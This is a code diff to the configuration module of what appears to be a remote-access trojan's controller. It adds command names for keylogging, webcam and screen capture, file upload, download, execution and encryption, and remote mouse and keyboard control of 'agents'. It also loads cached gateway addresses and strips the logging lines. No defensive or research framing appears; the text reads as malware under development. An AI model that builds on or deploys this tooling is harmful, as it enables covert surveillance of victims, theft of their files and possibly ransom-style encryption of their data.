@@ -26,12 +26,13 @@ export const CONFIG = {
         PROC_START: "STARTPROC",
         PROC_KILL: "STOPPROC",
 
-        CAM_RECORD: "cam_record",
+        CAM_RECORD: "CAM_RECORD",
         CAMSHOT: "CAMSHOT",
-        SCREENSHOT: "SCRSHOT",
+        SCREENSHOT: "SCRSHOT", 
         SCR_RECORD: "SCR_RECORD",
         START_KEYLOG: "STARTKLOG",
         STOP_KEYLOG: "STOPKLOG",
+        STREAM_DATA: "stream_data",
 
         SHUTDOWN: "shutdown",
         RESTART: "restart",
@@ -41,11 +42,28 @@ export const CONFIG = {
         WHOAMI: "whoami",
 
         GET_AGENTS: "get_agents",
-        AGEN_STATUS: "agent_status",
+        AGENT_STATUS: "agent_status", 
         CONNECT_AGENT: "connect_agent",
-        STREAM_DATA: "stream_data",
+
+        FILE_LIST: "file_list",     
+        FILE_UPLOAD: "file_upload",   
+        FILE_DOWNLOAD: "file_download", 
+        FILE_CHUNK: "file_chunk",    
+        FILE_PROGRESS: "file_progress", 
+        FILE_COMPLETE: "file_complete",
+
+        FILE_EXECUTE: "file_execute",
+        FILE_ENCRYPT: "file_encrypt",
+        SYSTEM_INFO: "system_info",
+
+        START_STREAM : "start_stream",
+        STOP_STREAM : "stop_stream",
+        STREAM_FRAME : "stream_frame", 
         
-        FILE_LIST: "file_list"
+        MOUSE_MOVE : "mouse_move",
+        MOUSE_CLICK : "mouse_click",
+        KEY_EVENT : "key_event"
+
     },
     SCAN_TIMEOUT: 1500,
     SCAN_BATCH_SIZE: 30
@@ -53,24 +71,20 @@ export const CONFIG = {
 
 export function loadDefaultGateways() {
     const gateways = [...CONFIG.DEFAULT_GATEWAYS];
-    
     const urlGateway = getGatewayFromURL();
 
     if (urlGateway) {
         gateways.unshift (
             {ip: urlGateway.ip, port: urlGateway.port, protocol: urlGateway.protocol}
         );
-        console.log(`[Config] Using gateway from URL: ${urlGateway.ip}:${urlGateway.port} (${urlGateway.protocol})`);
     }
 
     const cacheIp = localStorage.getItem(CONFIG.LOCAL_STORAGE_GATEWAY_KEY);
-
     if (cacheIp && cacheIp !== 'localhost') {
         gateways.unshift(
             {ip: cacheIp, port: 8080, protocol: 'wss'},
             {ip: cacheIp, port: 8082, protocol: 'ws'}
         );
-        console.log(`[Config] Using cached gateway: ${cacheIp}:8080 (wss) and ${cacheIp}:8082 (ws)`);
     }
     
     return gateways;
